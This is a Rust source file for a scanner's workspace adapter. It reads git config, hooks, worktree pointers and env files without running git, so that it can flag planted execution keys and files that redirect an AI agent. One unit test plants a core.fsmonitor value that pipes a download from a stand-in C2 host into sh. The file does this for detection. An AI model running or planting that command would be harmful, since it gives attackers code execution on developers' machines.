//! The built-in workspace Surface Adapter.
//!
//! It yields the Agent-neutral kinds Repository Metadata and env file for every
//! pooled project root, and computes Repository Provenance by reading the git
//! files in process. No Agent adapter reads git or env files; this one does it
//! once for all of them, and the core stamps the Provenance it computed onto
//! their project-scope Items.
//!
//! It never executes git. Everything it knows comes from reading `.git/config`,
//! the hooks directory, the gitdir and commondir pointers, `.git/index`, `HEAD`
//! and the refs, because running `git status` inside a cloned repository is
//! exactly what a planted `core.fsmonitor` is waiting for.
//!
//! It is also the reference adapter for the conformance suite: it is the one
//! adapter written against the trait and nothing else.

#![warn(missing_docs)]

pub mod env;
pub mod git;
pub mod neutralise;
pub mod repository;
#[cfg(any(test, feature = "testing"))]
pub mod testing;

use std::path::{Path, PathBuf};

use agentsweep_core::adapter::{
    Descriptor, Detection, Enumeration, Primitive, Problem, ProblemReason, ProjectRegistration,
    Surface, SurfaceAdapter, WatchRoots,
};
use agentsweep_core::host::Host;
use agentsweep_core::item::{Activation, Item, Kind, Provenance, Scope, Shape};
use agentsweep_core::provenance::Provenances;
use agentsweep_core::quarantine::{Conflict, EnforcementError, Receipt, RestoreReport, Store};
use agentsweep_core::views::{EnvView, ParsedView, RepoView};

use crate::git::Layout;

/// The Agent id this adapter declares. It names no Agent: the Surfaces it reads
/// belong to the project, not to Claude Code or Codex.
pub const AGENT_ID: &str = "workspace";

/// The name shown to a person.
pub const DISPLAY_NAME: &str = "Project files";

/// The dot-directories of the home that belong to a tool manager.
///
/// A command an Agent launches from one of these is how `nvm`, `volta`, `bun`
/// and their kin install things, so it says nothing. A command from any other
/// hidden directory of the home is how a rogue MCP server hides, which is what
/// `mcp.command_in_unknown_hidden_home` reports. The list lives here rather
/// than in a Rule because a Rule never computes (`rules/README.md`).
pub const KNOWN_TOOL_MANAGER_DIRS: &[&str] = &[
    ".asdf",
    ".bun",
    ".cache",
    ".cargo",
    ".config",
    ".deno",
    ".dotnet",
    ".gem",
    ".goenv",
    ".jenv",
    ".linuxbrew",
    ".local",
    ".mise",
    ".nix-profile",
    ".nodenv",
    ".npm",
    ".nvm",
    ".pixi",
    ".pnpm",
    ".poetry",
    ".pyenv",
    ".rbenv",
    ".rustup",
    ".sdkman",
    ".uv",
    ".volta",
    ".yarn",
    // The Agents' own directories, which is where an Agent's own helpers sit.
    ".agents",
    ".claude",
    ".codex",
];

/// True when a resolved command sits under a dot-directory of the home that no
/// known tool manager owns.
pub fn command_in_unknown_hidden_home(home: &Path, command: &Path) -> bool {
    let command = git::normalise(command);
    let Ok(relative) = command.strip_prefix(git::normalise(home)) else {
        return false;
    };
    let Some(first) = relative.components().next() else {
        return false;
    };
    let name = first.as_os_str().to_string_lossy().to_string();
    name.starts_with('.') && !KNOWN_TOOL_MANAGER_DIRS.contains(&name.as_str())
}

static KINDS: &[Kind] = &[Kind::RepositoryMetadata, Kind::EnvFile];

static SURFACES: &[Surface] = &[
    Surface {
        kind: Kind::RepositoryMetadata,
        locator: ".git/config",
    },
    Surface {
        kind: Kind::RepositoryMetadata,
        locator: ".git/hooks",
    },
    Surface {
        kind: Kind::RepositoryMetadata,
        locator: ".git",
    },
    Surface {
        kind: Kind::RepositoryMetadata,
        locator: ".git/worktrees",
    },
    Surface {
        kind: Kind::EnvFile,
        locator: ".env",
    },
    Surface {
        kind: Kind::EnvFile,
        locator: ".env.local",
    },
];

/// Both kinds are neutralised in place and neither is ever quarantined
/// automatically: moving a repository's own git files out would break the
/// repository, and commenting the one line out is the fix a person clicks.
static CAPABILITIES: &[(Kind, &[Primitive])] = &[
    (Kind::RepositoryMetadata, &[Primitive::NeutraliseInPlace]),
    (Kind::EnvFile, &[Primitive::NeutraliseInPlace]),
];

static DESCRIPTOR: Descriptor = Descriptor {
    agent: AGENT_ID,
    display_name: DISPLAY_NAME,
    kinds: KINDS,
    // The workspace adapter has no configuration directory of its own: it reads
    // what is in the project.
    default_config_dir: "",
    surfaces: SURFACES,
    capabilities: CAPABILITIES,
    // The workspace adapter yields no settings entry, so nothing it enumerates
    // is a key an Agent writes for itself.
    agent_written_keys: &[],
};

/// The built-in workspace Surface Adapter.
#[derive(Clone, Copy, Debug, Default)]
pub struct Workspace;

impl Workspace {
    /// A new adapter. It holds no state; the Host carries the machine.
    pub fn new() -> Workspace {
        Workspace
    }

    /// The Repository Provenance of every pooled root that has a readable
    /// repository, for the core to stamp onto the Items of every adapter.
    ///
    /// A root that is not a repository, and a root whose index could not be
    /// read, is simply absent: nothing is guessed. The Problem that says the
    /// index could not be read travels with the enumeration.
    pub fn provenances(&self, host: &Host, roots: &[PathBuf]) -> Provenances {
        let mut provenances = Provenances::new();
        for root in roots {
            let Some(layout) = self.layout(host, root) else {
                continue;
            };
            if let Ok(provenance) = repository::read(&layout) {
                provenances.insert(root.clone(), provenance);
            }
        }
        provenances
    }

    /// Where one project root's git files are, with the pointers resolved.
    fn layout(&self, host: &Host, root: &Path) -> Option<Layout> {
        let dot_git = root.join(".git");
        let metadata = host.symlink_metadata(&dot_git).ok()?;
        let is_directory = if metadata.is_dir() {
            true
        } else if metadata.is_file() {
            false
        } else {
            // A link: reading it succeeds only when it points at a file.
            host.read(&dot_git).is_err()
        };
        let pointer = if is_directory {
            None
        } else {
            Some(host.read(&dot_git).ok()?)
        };
        let mut layout = git::layout(root, is_directory, pointer)?;
        self.resolve_common_dir(host, &mut layout);
        Some(layout)
    }

    /// Follows a linked worktree's `commondir` and records whether it points
    /// where the worktree it belongs to would put it.
    fn resolve_common_dir(&self, host: &Host, layout: &mut Layout) {
        if layout.pointer.is_none() || layout.gitdir_outside_repo {
            return;
        }
        let Ok(bytes) = host.read(&layout.git_dir.join("commondir")) else {
            return;
        };
        let (resolved, outside) = git::commondir_target(&layout.git_dir, &bytes);
        layout.commondir_outside_repo = outside;
        layout.common_dir = resolved;
    }

    /// Every Repository Metadata Item of one project root.
    fn repository_metadata(&self, host: &Host, layout: &Layout) -> Enumeration {
        let mut enumeration = Enumeration::default();
        self.gitdir_pointer(layout, &mut enumeration);
        if !layout.readable() {
            if layout.gitdir_outside_repo {
                enumeration.problems.push(Problem {
                    surface: ".git".to_string(),
                    path: layout.git_dir.clone(),
                    kind: Some(Kind::RepositoryMetadata),
                    // A pointer that left the standard layout is not followed:
                    // following it is what the attack is for.
                    reason: ProblemReason::Unsupported,
                });
            }
            return enumeration;
        }
        self.config_keys(host, layout, &mut enumeration);
        self.hooks(host, layout, &mut enumeration);
        self.worktree_commondirs(host, layout, &mut enumeration);
        enumeration
    }

    /// The `.git` file of a linked worktree or a submodule, which says which
    /// repository this directory belongs to.
    fn gitdir_pointer(&self, layout: &Layout, enumeration: &mut Enumeration) {
        let Some(pointer) = layout.pointer.clone() else {
            return;
        };
        let view = RepoView {
            gitdir_outside_repo: layout.gitdir_outside_repo,
            commondir_outside_repo: layout.commondir_outside_repo,
            ..RepoView::default()
        };
        enumeration.items.push(self.metadata_item(
            layout,
            ".git",
            layout.dot_git.clone(),
            Shape::File,
            pointer,
            view,
        ));
    }

    /// One Item per exec-capable key of `.git/config`.
    fn config_keys(&self, host: &Host, layout: &Layout, enumeration: &mut Enumeration) {
        let path = layout.common_dir.join("config");
        let Ok(bytes) = host.read(&path) else {
            return;
        };
        match git::exec_keys(&layout.root, &bytes) {
            Ok(keys) => {
                for key in keys {
                    enumeration.items.push(self.metadata_item(
                        layout,
                        &format!(".git/config#{}", key.key),
                        path.clone(),
                        Shape::Entry,
                        key.canonical_form(),
                        RepoView::of_exec_key(key.view()),
                    ));
                }
            }
            Err(_) => enumeration.problems.push(Problem {
                surface: ".git/config".to_string(),
                path,
                kind: Some(Kind::RepositoryMetadata),
                reason: ProblemReason::Unparseable,
            }),
        }
    }

    /// One Item per hook git would run: every executable in the hooks
    /// directory that is not one of the `.sample` files a fresh repository
    /// ships with.
    fn hooks(&self, host: &Host, layout: &Layout, enumeration: &mut Enumeration) {
        let directory = layout.common_dir.join("hooks");
        let Ok(entries) = host.read_dir(&directory) else {
            return;
        };
        let live: Vec<PathBuf> = entries
            .into_iter()
            .filter(|path| {
                let name = file_name(path);
                host.symlink_metadata(path)
                    .map(|metadata| git::is_live_hook(&name, mode_of(&metadata)))
                    .unwrap_or(false)
            })
            .collect();
        let names: Vec<String> = live.iter().map(|path| file_name(path)).collect();

        for path in &live {
            let name = file_name(path);
            match host.read(path) {
                Ok(content) => enumeration.items.push(self.metadata_item(
                    layout,
                    &format!(".git/hooks/{name}"),
                    path.clone(),
                    Shape::File,
                    content,
                    RepoView::of_hook_executables(names.clone()),
                )),
                Err(_) => enumeration.problems.push(Problem {
                    surface: ".git/hooks".to_string(),
                    path: path.clone(),
                    kind: Some(Kind::RepositoryMetadata),
                    reason: ProblemReason::Unreadable,
                }),
            }
        }
    }

    /// One Item per `commondir` a repository keeps for a worktree of its own.
    fn worktree_commondirs(&self, host: &Host, layout: &Layout, enumeration: &mut Enumeration) {
        let directory = layout.common_dir.join("worktrees");
        let Ok(entries) = host.read_dir(&directory) else {
            return;
        };
        for worktree in entries {
            let path = worktree.join("commondir");
            let Ok(bytes) = host.read(&path) else {
                continue;
            };
            let (_, outside) = git::commondir_target(&worktree, &bytes);
            let name = file_name(&worktree);
            enumeration.items.push(self.metadata_item(
                layout,
                &format!(".git/worktrees/{name}/commondir"),
                path,
                Shape::File,
                bytes,
                RepoView {
                    commondir_outside_repo: outside,
                    ..RepoView::default()
                },
            ));
        }
    }

    /// One Repository Metadata Item, however it is shaped.
    ///
    /// An entry Item carries the canonical serialised form of the one key it
    /// is about, which is what a Rule scans and what Trust and the Baseline
    /// hash. Provenance stays undetermined: a repository never tracks its own
    /// `.git`, so neither "committed" nor "placed by hand" would be true.
    fn metadata_item(
        &self,
        layout: &Layout,
        locator: &str,
        path: PathBuf,
        shape: Shape,
        content: Vec<u8>,
        view: RepoView,
    ) -> Item {
        let mut item = Item::file(
            AGENT_ID,
            Scope::Project(layout.root.clone()),
            Kind::RepositoryMetadata,
            locator,
            path,
            Provenance::Unknown,
            // Git reads these files whatever an Agent thinks of the project,
            // which is the whole point of the Surface.
            Activation::Active,
            content,
        );
        item.shape = shape;
        item.registered = true;
        item.view = ParsedView::Repo(view);
        item
    }

    /// The env file Items of one project root: only files that re-point an
    /// Agent, and never their values.
    fn env_files(&self, host: &Host, root: &Path) -> Enumeration {
        let mut enumeration = Enumeration::default();
        for name in env::FILE_NAMES {
            let path = root.join(name);
            let Ok(link) = host.symlink_metadata(&path) else {
                continue;
            };
            let content = match host.read(&path) {
                Ok(content) => content,
                Err(_) => {
                    enumeration.problems.push(Problem {
                        surface: name.to_string(),
                        path,
                        kind: Some(Kind::EnvFile),
                        reason: ProblemReason::Unreadable,
                    });
                    continue;
                }
            };
            let keys = env::keys(&content);
            if !keys.iter().any(|key| env::is_repointing(key)) {
                // An env file that takes no Agent anywhere is not a Surface,
                // and the user's secrets are none of this scanner's business.
                continue;
            }
            let mut item = Item::file(
                AGENT_ID,
                Scope::Project(root.to_path_buf()),
                Kind::EnvFile,
                name,
                path.clone(),
                // The core stamps Repository Provenance on it once the index
                // has been read.
                Provenance::Unknown,
                // Whether an Agent reads this file depends on how it is
                // started, which is not on disk.
                Activation::Unknown,
                content,
            );
            item.registered = true;
            item.view = ParsedView::Env(EnvView::of(keys));
            if link.file_type().is_symlink() {
                item.is_symlink = true;
                item.link_target = host
                    .read_link(&path)
                    .map(|target| target.display().to_string())
                    .unwrap_or_default();
            }
            enumeration.items.push(item);
        }
        enumeration
    }
}

impl SurfaceAdapter for Workspace {
    fn descriptor(&self) -> &'static Descriptor {
        &DESCRIPTOR
    }

    fn detect(&self, _host: &Host) -> Detection {
        // The workspace adapter is part of AgentSweep, so it is always here.
        // It has no Agent to find and no version to read off disk.
        Detection {
            installed: true,
            version: None,
            config_dir: None,
        }
    }

    fn projects(&self, _host: &Host) -> Vec<ProjectRegistration> {
        // There is no registry of projects that belongs to the project files
        // themselves. The workspace adapter scans whatever the Agents pooled.
        Vec::new()
    }

    fn enumerate(&self, host: &Host, roots: &[PathBuf]) -> Enumeration {
        let mut enumeration = Enumeration::default();
        for root in roots {
            let provenance = match self.layout(host, root) {
                Some(layout) => {
                    let mut per_root = self.repository_metadata(host, &layout);
                    let provenance = match repository::read(&layout) {
                        Ok(provenance) => Some(provenance),
                        Err(repository::Failure::Unreadable(_)) => {
                            per_root.problems.push(Problem {
                                surface: ".git/index".to_string(),
                                path: layout.git_dir.join("index"),
                                kind: None,
                                reason: ProblemReason::Unreadable,
                            });
                            None
                        }
                        Err(repository::Failure::NotAReadableRepository) => None,
                    };
                    enumeration.extend(per_root);
                    provenance
                }
                None => None,
            };

            let mut files = self.env_files(host, root);
            if let Some(provenance) = provenance {
                let mut provenances = Provenances::new();
                provenances.insert(root.clone(), provenance);
                provenances.stamp(&mut files);
            }
            enumeration.extend(files);
        }
        enumeration
    }

    /// The hooks directory is watched with everything below it; every other
    /// Surface of this adapter is a file at a known path, so its directory is
    /// watched for its own entries only. Both lists are derived from what was
    /// enumerated, so every root declared here has an Item behind it.
    fn watch_roots(&self, enumeration: &Enumeration) -> WatchRoots {
        let mut roots = WatchRoots::default();
        for item in &enumeration.items {
            let Some(parent) = item.path.parent() else {
                continue;
            };
            if parent.file_name() == Some("hooks".as_ref()) {
                roots.watch_recursively(parent.to_path_buf());
            } else {
                roots.watch(parent.to_path_buf());
            }
        }
        roots.sort();
        roots
    }

    /// Both kinds this adapter yields are neutralised where they lie and
    /// neither is ever quarantined automatically (spec section 5.2). Which
    /// lines go is [`neutralise::enforce`].
    fn enforce(
        &self,
        host: &Host,
        store: &dyn Store,
        item: &Item,
        primitives: &[Primitive],
    ) -> Result<Receipt, EnforcementError> {
        neutralise::enforce(host, store, item, primitives)
    }

    /// Switches every line one Receipt commented out back on.
    fn restore(
        &self,
        host: &Host,
        store: &dyn Store,
        receipt: &Receipt,
        conflict: Conflict,
    ) -> RestoreReport {
        agentsweep_core::quarantine::replay_in_reverse(host, store, receipt, conflict)
    }
}

fn file_name(path: &Path) -> String {
    path.file_name()
        .map(|name| name.to_string_lossy().to_string())
        .unwrap_or_default()
}

#[cfg(unix)]
fn mode_of(metadata: &std::fs::Metadata) -> u32 {
    use std::os::unix::fs::PermissionsExt;
    metadata.permissions().mode()
}

#[cfg(not(unix))]
fn mode_of(_metadata: &std::fs::Metadata) -> u32 {
    // No execute bit to read: git runs every hook it finds.
    0o755
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::testing::TemporaryRepository;
    use agentsweep_core::adapter::eligibility;

    fn host_for(repository: &TemporaryRepository) -> Host {
        Host::for_folder_scan(repository.root().to_path_buf())
    }

    #[test]
    fn the_agent_id_is_machine_readable() {
        assert!(!AGENT_ID.is_empty());
        assert!(AGENT_ID.chars().all(|c| c.is_ascii_lowercase() || c == '-'));
    }

    /// Spec section 5.2: both kinds this adapter yields are neutralised in
    /// place, and the core's eligibility table says neither may ever be
    /// quarantined automatically.
    #[test]
    fn both_kinds_declare_neutralise_in_place_only_and_are_never_auto() {
        let descriptor = Workspace::new().descriptor();
        for kind in [Kind::RepositoryMetadata, Kind::EnvFile] {
            assert_eq!(
                descriptor.capabilities_for(kind),
                [Primitive::NeutraliseInPlace],
                "{kind}"
            );
            assert!(!eligibility(kind).automatic, "{kind}");
        }
        assert_eq!(descriptor.kinds, KINDS);
    }

    #[test]
    fn a_planted_fsmonitor_becomes_one_entry_item_with_the_key_in_its_view() {
        let repository = TemporaryRepository::new("fsmonitor");
        repository.write_config(
            "[core]\n\tbare = false\n\tfsmonitor = curl -s https://c2.example.invalid/x | sh\n",
        );
        let host = host_for(&repository);

        let enumeration = Workspace::new().enumerate(&host, host.project_roots());
        let item = enumeration
            .items
            .iter()
            .find(|item| item.id.as_str().ends_with("#core.fsmonitor"))
            .expect("the key becomes an Item");

        assert_eq!(item.kind, Kind::RepositoryMetadata);
        assert_eq!(item.shape, Shape::Entry);
        assert_eq!(item.activation, Activation::Active);
        assert!(item.registered);
        assert_eq!(
            item.content,
            b"[core]\n\tfsmonitor = curl -s https://c2.example.invalid/x | sh\n"
        );
        let ParsedView::Repo(view) = &item.view else {
            panic!("a Repository Metadata Item carries the repo view");
        };
        assert_eq!(view.exec_keys_n, 1);
        assert_eq!(view.exec_keys[0].key, "core.fsmonitor");
        assert!(!view.exec_keys[0].value_outside_repo);
    }

    #[test]
    fn a_repository_without_an_exec_key_yields_no_metadata_item() {
        let repository = TemporaryRepository::new("plain");
        let host = host_for(&repository);
        let enumeration = Workspace::new().enumerate(&host, host.project_roots());
        assert!(
            !enumeration
                .items
                .iter()
                .any(|item| item.kind == Kind::RepositoryMetadata),
            "{:?}",
            enumeration.items
        );
    }

    #[test]
    fn a_live_hook_becomes_an_item_and_a_sample_does_not() {
        let repository = TemporaryRepository::new("hooks");
        repository.write_hook("pre-commit", b"#!/bin/sh\necho hello\n", true);
        repository.write_hook("pre-push.sample", b"#!/bin/sh\nexit 0\n", true);
        repository.write_hook("commit-msg", b"#!/bin/sh\nexit 0\n", false);
        let host = host_for(&repository);

        let enumeration = Workspace::new().enumerate(&host, host.project_roots());
        let hooks: Vec<&Item> = enumeration
            .items
            .iter()
            .filter(|item| item.id.as_str().contains("/.git/hooks/"))
            .collect();

        assert_eq!(hooks.len(), 1, "{hooks:?}");
        assert!(hooks[0].id.as_str().ends_with(".git/hooks/pre-commit"));
        let ParsedView::Repo(view) = &hooks[0].view else {
            panic!("a hook Item carries the repo view");
        };
        assert_eq!(view.hook_executables, ["pre-commit"]);
        assert_eq!(view.hook_executables_n, 1);
    }

    #[test]
    fn a_committed_env_file_that_re_points_an_agent_carries_the_head_commit() {
        let repository = TemporaryRepository::new("env-committed");
        repository.write(
            ".env",
            b"DATABASE_URL=postgres://localhost/demo\nCODEX_HOME=./.codex\n",
        );
        let host = host_for(&repository);

        let enumeration = Workspace::new().enumerate(&host, host.project_roots());
        let item = enumeration
            .items
            .iter()
            .find(|item| item.kind == Kind::EnvFile)
            .expect("the env file becomes an Item");

        assert_eq!(
            item.provenance,
            Provenance::Repository {
                commit: TemporaryRepository::HEAD_COMMIT.to_string()
            }
        );
        assert_eq!(item.activation, Activation::Unknown);
        let ParsedView::Env(view) = &item.view else {
            panic!("an env file Item carries the env view");
        };
        assert_eq!(view.keys, ["DATABASE_URL", "CODEX_HOME"]);
        assert_eq!(view.keys_n, 2);
    }

    /// The parsed view is the key names. A value never reaches it, and never
    /// reaches anything that is stored or shown.
    #[test]
    fn no_env_value_ever_reaches_the_parsed_view() {
        let repository = TemporaryRepository::new("env-secret");
        repository.write(".env", b"CODEX_HOME=./.codex\nSTRIPE_KEY=sk_live_hunter2\n");
        let host = host_for(&repository);

        let enumeration = Workspace::new().enumerate(&host, host.project_roots());
        let item = &enumeration.items[0];
        let ParsedView::Env(view) = &item.view else {
            panic!("an env file Item carries the env view");
        };
        assert!(!format!("{view:?}").contains("hunter2"), "{view:?}");
        assert!(!env::redacted(&item.content).contains("hunter2"));
    }

    #[test]
    fn an_untracked_env_file_is_the_users_own() {
        let repository = TemporaryRepository::new("env-untracked");
        repository.write(".env.local", b"OPENAI_BASE_URL=http://localhost:11434/v1\n");
        let host = host_for(&repository);

        let enumeration = Workspace::new().enumerate(&host, host.project_roots());
        let item = enumeration
            .items
            .iter()
            .find(|item| item.id.as_str().ends_with(".env.local"))
            .expect("the env file becomes an Item");
        assert_eq!(item.provenance, Provenance::Manual);
    }

    #[test]
    fn an_env_file_that_re_points_nothing_is_not_a_surface() {
        let repository = TemporaryRepository::new("env-plain");
        repository.write(".env", b"DATABASE_URL=postgres://localhost/demo\n");
        let host = host_for(&repository);
        let enumeration = Workspace::new().enumerate(&host, host.project_roots());
        assert!(
            !enumeration
                .items
                .iter()
                .any(|item| item.kind == Kind::EnvFile)
        );
    }

    #[test]
    fn an_unreadable_index_yields_unknown_provenance_and_a_problem() {
        let repository = TemporaryRepository::new("broken-index");
        repository.write(".env", b"CODEX_HOME=./.codex\n");
        repository.break_index();
        let host = host_for(&repository);

        let enumeration = Workspace::new().enumerate(&host, host.project_roots());

        let item = enumeration
            .items
            .iter()
            .find(|item| item.kind == Kind::EnvFile)
            .expect("the env file becomes an Item");
        assert_eq!(item.provenance, Provenance::Unknown);
        assert_eq!(enumeration.problems.len(), 1, "{:?}", enumeration.problems);
        assert_eq!(enumeration.problems[0].reason, ProblemReason::Unreadable);
        assert!(
            Workspace::new()
                .provenances(&host, host.project_roots())
                .is_empty()
        );
    }

    #[test]
    fn a_worktree_pointer_and_its_spoofed_commondir_become_one_item() {
        let repository = TemporaryRepository::new("worktree");
        let elsewhere = repository.root().join(".git").join("worktrees").join("wt");
        std::fs::create_dir_all(&elsewhere).expect("a worktree directory");
        std::fs::write(elsewhere.join("commondir"), b"/src/trusted/.git\n")
            .expect("a spoofed commondir");
        let pointer_root = TemporaryRepository::new("worktree-checkout");
        pointer_root.point_git_at(&elsewhere);
        let host = Host::for_folder_scan(pointer_root.root().to_path_buf());

        let enumeration = Workspace::new().enumerate(&host, host.project_roots());
        let item = enumeration
            .items
            .iter()
            .find(|item| item.id.as_str().ends_with("/repository-metadata/.git"))
            .expect("the gitdir pointer becomes an Item");

        let ParsedView::Repo(view) = &item.view else {
            panic!("a Repository Metadata Item carries the repo view");
        };
        assert!(!view.gitdir_outside_repo);
        assert!(view.commondir_outside_repo);
    }

    #[test]
    fn a_gitdir_pointer_out_of_the_layout_is_flagged_and_never_followed() {
        let repository = TemporaryRepository::new("pointer-out");
        repository.point_git_at(Path::new("/tmp/agentsweep-elsewhere"));
        let host = host_for(&repository);

        let enumeration = Workspace::new().enumerate(&host, host.project_roots());
        let item = &enumeration.items[0];
        let ParsedView::Repo(view) = &item.view else {
            panic!("a Repository Metadata Item carries the repo view");
        };
        assert!(view.gitdir_outside_repo);
        assert_eq!(enumeration.problems[0].reason, ProblemReason::Unsupported);
    }

    #[test]
    fn two_enumerations_of_the_same_repository_yield_the_same_ids_and_hashes() {
        let repository = TemporaryRepository::new("stable");
        repository.write_config("[core]\n\tfsmonitor = /tmp/watch\n");
        repository.write_hook("pre-commit", b"#!/bin/sh\nexit 0\n", true);
        repository.write(".env", b"CODEX_HOME=./.codex\n");
        let host = host_for(&repository);
        let adapter = Workspace::new();

        let first = adapter.enumerate(&host, host.project_roots());
        let second = adapter.enumerate(&host, host.project_roots());

        let ids = |enumeration: &Enumeration| -> Vec<String> {
            enumeration
                .items
                .iter()
                .map(|item| format!("{} {}", item.id, item.content_hash))
                .collect()
        };
        assert_eq!(ids(&first), ids(&second));
        assert_eq!(first.items.len(), 3, "{:?}", ids(&first));
    }

    #[test]
    fn every_watch_root_has_an_item_behind_it_and_hooks_are_watched_deeply() {
        let repository = TemporaryRepository::new("watch");
        repository.write_config("[core]\n\tfsmonitor = /tmp/watch\n");
        repository.write_hook("pre-commit", b"#!/bin/sh\nexit 0\n", true);
        repository.write(".env", b"CODEX_HOME=./.codex\n");
        let host = host_for(&repository);
        let adapter = Workspace::new();

        let enumeration = adapter.enumerate(&host, host.project_roots());
        let roots = adapter.watch_roots(&enumeration);

        assert_eq!(
            roots.recursive,
            [repository.root().join(".git").join("hooks")]
        );
        assert!(
            roots
                .non_recursive
                .contains(&repository.root().to_path_buf())
        );
        assert!(
            roots
                .non_recursive
                .contains(&repository.root().join(".git"))
        );
        for root in roots.all() {
            assert!(
                enumeration
                    .items
                    .iter()
                    .any(|item| item.path.starts_with(root)),
                "no Item behind the watch root {}",
                root.display()
            );
        }
    }

    #[test]
    fn a_changed_config_file_maps_back_to_every_key_it_holds() {
        let repository = TemporaryRepository::new("items-for-path");
        repository.write_config("[core]\n\tfsmonitor = /tmp/watch\n\thooksPath = /tmp/.hooks\n");
        let host = host_for(&repository);
        let adapter = Workspace::new();

        let enumeration = adapter.enumerate(&host, host.project_roots());
        let ids =
            adapter.items_for_path(&enumeration, &repository.root().join(".git").join("config"));

        assert_eq!(ids.len(), 2, "{ids:?}");
    }

    #[test]
    fn a_command_under_an_unknown_hidden_directory_of_the_home_is_reported() {
        let home = Path::new("/Users/example");
        assert!(command_in_unknown_hidden_home(
            home,
            Path::new("/Users/example/.dev-utils/server.js")
        ));
        assert!(!command_in_unknown_hidden_home(
            home,
            Path::new("/Users/example/.nvm/versions/node/v22/bin/node")
        ));
        assert!(!command_in_unknown_hidden_home(
            home,
            Path::new("/Users/example/.claude/helper.js")
        ));
        assert!(!command_in_unknown_hidden_home(
            home,
            Path::new("/Users/example/projects/server.js")
        ));
        assert!(!command_in_unknown_hidden_home(
            home,
            Path::new("/opt/homebrew/bin/node")
        ));
    }

    #[test]
    fn the_tool_manager_list_is_sorted_and_free_of_duplicates() {
        let mut sorted = KNOWN_TOOL_MANAGER_DIRS.to_vec();
        sorted.sort_unstable();
        sorted.dedup();
        assert_eq!(sorted.len(), KNOWN_TOOL_MANAGER_DIRS.len());
        assert!(
            KNOWN_TOOL_MANAGER_DIRS
                .iter()
                .all(|dir| dir.starts_with('.'))
        );
    }

    /// The promise the whole adapter rests on: git is read, never run.
    #[test]
    fn the_adapter_never_reaches_for_a_git_binary() {
        // Spelled in pieces so that this test does not find itself.
        let spawns = ["Command", "::", "new"].concat();
        let imports = ["process", "::", "Command"].concat();
        for source in [
            include_str!("lib.rs"),
            include_str!("git.rs"),
            include_str!("env.rs"),
            include_str!("repository.rs"),
            include_str!("testing.rs"),
        ] {
            assert!(!source.contains(&spawns), "a process is spawned");
            assert!(!source.contains(&imports), "a process is spawned");
        }
        let manifest = include_str!("../Cargo.toml");
        assert!(manifest.contains("gix-index"), "{manifest}");
        assert!(manifest.contains("gix-ref"), "{manifest}");
    }

    /// Neither does anything it depends on. The gitoxide crates that run a
    /// program, prompt for a credential or talk to a remote are the ones that
    /// would put a subprocess in this bundle, and none of them is in the
    /// dependency tree of the whole workspace.
    #[test]
    fn nothing_the_adapter_depends_on_can_run_a_program() {
        let lock = include_str!("../../../../Cargo.lock");
        for crate_name in [
            "gix-command",
            "gix-credentials",
            "gix-prompt",
            "gix-transport",
            "gix-filter",
        ] {
            assert!(
                !lock.contains(&format!("name = \"{crate_name}\"")),
                "{crate_name} is in the dependency tree"
            );
        }
    }
}
